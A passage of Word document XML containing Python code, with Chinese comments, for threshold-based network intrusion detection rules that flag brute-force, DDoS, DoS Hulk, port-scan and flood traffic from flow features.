        <w:t xml:space="preserve">    category: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC26B54">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    observed: float</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7859E3CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    threshold: float</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="052781EC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    detail: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC297DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DB5CB27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    @property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6D117A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def strength(self) -&gt; float:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E45B422">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.observed / self.threshold if self.threshold else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDDACD9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EC30109">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    def as_evidence(self) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B25EF6F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        """塞进告警 evidence 列表的形态。带 detail，报告侧按它措辞而不是按 z 分数。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CE98C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15453DAA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "feature": f"规则 {self.rule}",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4788EFC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "value": round(self.observed, 3),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1863107F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "detail": f"{self.detail}（阈值 {self.threshold:g}，实测 {self.observed:g}）",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="150158FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34CA0D06">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A1CDBB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37BC3E4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _num(feats: Mapping[str, float], name: str) -&gt; float:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA1D97D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A2F329">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return float(feats.get(name, 0.0) or 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="380B8008">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except (TypeError, ValueError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6153CC5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2D18F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BC63B23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BA482FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def flow_rules(feats: Mapping[str, float]) -&gt; list[RuleHit]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C5B5FF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """单流规则。**列表顺序就是优先级**，pick() 取第一条，别改成按强度选——</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9186B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    不同规则的"超出多少倍"之间没有可比性。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31D236F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dur = _num(feats, "Flow Duration")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3392E1E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fwd = _num(feats, "Total Fwd Packets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444C5297">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bwd = _num(feats, "Total Backward Packets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2B52D9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pps = _num(feats, "Flow Packets/s")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11913E4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    syn = _num(feats, "SYN Flag Count")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="177DE8DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ack = _num(feats, "ACK Flag Count")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="779A613E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bwd_bytes = _num(feats, "Total Length of Bwd Packets")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D89CA9E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="613C5C30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hits = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50568289">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if fwd &gt;= PATATOR_MIN_FWD and bwd &gt;= PATATOR_MIN_BWD and dur &gt;= PATATOR_MIN_DURATION:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABD103E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151BD7C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "patator_short", "Patator", fwd + bwd, PATATOR_MIN_FWD + PATATOR_MIN_BWD,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C65D3D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"单流 {fwd:g} 前向 / {bwd:g} 后向包，符合暴力破解反复短连接",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1115B1ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1842CFD3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if bwd_bytes &gt;= DDOS_BWD_BYTES and 0 &lt; dur &lt;= DDOS_MAX_DURATION:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0262DE45">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ABB2D94">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "ddos_burst", "DDoS", bwd_bytes, DDOS_BWD_BYTES,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B76E15E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"单流在 {dur / 1e6:.2f} 秒内取回 {bwd_bytes:g} 字节，密度异常",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369D3633">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2A7CD2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if dur &gt;= HULK_MIN_DURATION and fwd &gt;= HULK_MIN_FWD_PKTS and bwd_bytes &gt;= DDOS_BWD_BYTES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028327FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325121E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "hulk_long", "DoS Hulk", dur / 1e6, HULK_MIN_DURATION / 1e6,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C935556">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"单流持续 {dur / 1e6:.1f} 秒、{fwd:g} 个前向包，符合慢速持续占用",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB36464">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="694B5760">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if dur &lt;= PORTSCAN_MAX_DURATION and fwd &lt;= 2 and bwd &lt;= 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A50B990">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits.append(RuleHit(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09F7BA64">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "portscan_short", "PortScan", PORTSCAN_MAX_DURATION / max(dur, 1.0), 1.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3403E912">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            f"单行流时长 {dur:g} 微秒、{fwd:g} 个前向包，符合端口探测",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4282BF55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584E8EF0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if fwd &gt;= FLOOD_FWD_PKTS and pps &gt;= FLOOD_PPS:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0651FE5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
